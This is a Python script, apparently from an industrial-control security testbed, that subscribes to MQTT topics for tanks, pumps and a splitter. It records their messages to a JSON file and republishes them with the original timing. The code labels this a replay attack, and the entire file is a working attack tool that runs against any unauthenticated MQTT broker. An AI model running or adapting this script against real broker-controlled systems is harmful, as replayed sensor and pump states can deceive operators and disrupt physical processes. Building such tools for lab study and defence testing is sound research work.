import time
import json
import threading
import paho.mqtt.client as mqtt

TOPICS = [ # Topics to subscribe to
    "tank/tank1/volume", "tank/tank2/volume", "tank/tank3/volume", 
    "tank/tank4/volume", "tank/tank5/volume", "tank/tank6/volume",
    "pump/pump1/state", "pump/pump2/state", "pump/pump3/state",
    "pump/pump4/state", "pump/pump5/state", "pump/pump6/state",
    "splitter/splitter1/state"
]

"""
    Captures MQTT messages for a specified time and stores them within a JSON file
    for later extraction and usage.

    Parameters:
        broker <string>: MQTT broker address (same as one in main.py)
        port <int>: MQTT broker port (same as one in main.py)
        topics <list>: List of topics to subscribe to
        capture_time <int>: Duration (in seconds) of capture time
        output_file <string>: The file to send captured messages to
"""
def capture_messages(
    broker="127.0.0.1", 
    port=1883, 
    topics=TOPICS,
    capture_time=10,  # Duration for capturing messages in seconds
    output_file="captured_data.json" # The output file to store captured data
):
    captured_messages = []

    # Constructs a dictionary entry for a captured topic and payload
    def on_message(client, userdata, msg):
        message_entry = {
            "timestamp": time.time(),
            "topic": msg.topic,
            "payload": msg.payload.decode("utf-8")
        }
        captured_messages.append(message_entry)
        print(f"[CAPTURE] {message_entry}")

    # Create a new client (keep the protocol, removing it causes capture issues)
    client = mqtt.Client(protocol=mqtt.MQTTv5)
    client.on_message = on_message

    # Connect to client
    try:
        client.connect(broker, port, keepalive=60)
    except Exception as e:
        print(f"[CAPTURE] Could not connect to MQTT broker: {e}")
        return
    
    # Subscribe to the specified topics
    for topic in topics:
        client.subscribe(topic)
        print(f"[CAPTURE] Subscribed to topic: {topic}")

    # Begin capturing messages for specified amount of time
    client.loop_start()
    print(f"[CAPTURE] Capturing messages for {capture_time} seconds...")
    time.sleep(capture_time)
    client.loop_stop()
    client.disconnect()

    # Write all captured messages to output file
    try:
        with open(output_file, "w") as f:
            json.dump(captured_messages, f, indent=4)
        print(f"[CAPTURE] Saved {len(captured_messages)} messages to {output_file}")
    except Exception as e:
        print(f"[CAPTURE] Failed to write captured data to file: {e}")

"""
    Replays all captured MQTT messages from a JSON file
    at approximately the same time they were originally captured

    Parameters:
        broker <string>: MQTT broker address (same as one in main.py)
        port <int>: MQTT broker port (same as one in main.py)
        input_file <string>: The file to get captured messages from
"""
def replay_messages(
    broker="127.0.0.1",
    port=1883,
    input_file="captured_data.json"
):
    # Open the input file to read from it
    try:
        with open(input_file, "r") as f:
            messages = json.load(f)
    except Exception as e:
        print(f"[REPLAY] Failed to read captured messages: {e}")
        return

    # Exits if there are no captured messages
    if not messages:
        print("[REPLAY] No messages to replay.")
        return
    
    # Connect to MQTT client
    client = mqtt.Client(protocol=mqtt.MQTTv5)
    try:
        client.connect(broker, port, keepalive=60)
    except Exception as e:
        print(f"[REPLAY] Could not connect to MQTT broker: {e}")
        return
    
    # Begin replay attack
    client.loop_start()
    print("[REPLAY] Starting replay of captured messages...")

    # Use first timestamp as base for relative timing
    base_time = messages[0]["timestamp"]
    replay_start = time.time()

    # Replay every message with the same spacing
    for msg in messages:
        original_offset = msg["timestamp"] - base_time
        delay = (replay_start + original_offset) - time.time()
        if delay > 0:
            time.sleep(delay)

        topic = msg["topic"]
        payload = msg["payload"]
        client.publish(topic, payload)
        print(f"[REPLAY] Published to {topic}: {payload}")

    client.loop_stop()
    client.disconnect()
    print("[REPLAY] Completed replay of messages.")

"""
    A simple function that first captures messages using the capture_messages
    function and then replays them using the replay_messages function

    Parameters:
        broker <string>: MQTT broker address (same as one in main.py)
        port <int>: MQTT broker port (same as one in main.py)
        topics <list>: List of topics to subscribe to
        capture_time <int>: Duration (in seconds) of capture time
        output_file <string>: The file to send captured messages to
"""
def capture_and_replay(
        broker="127.0.0.1",
        port=1883,
        topics=TOPICS,
        capture_time=10,
        file_name="captured_data.json"
):
    capture_messages(broker, port, topics, capture_time, file_name)
    time.sleep(2)
    replay_messages(broker, port, file_name)

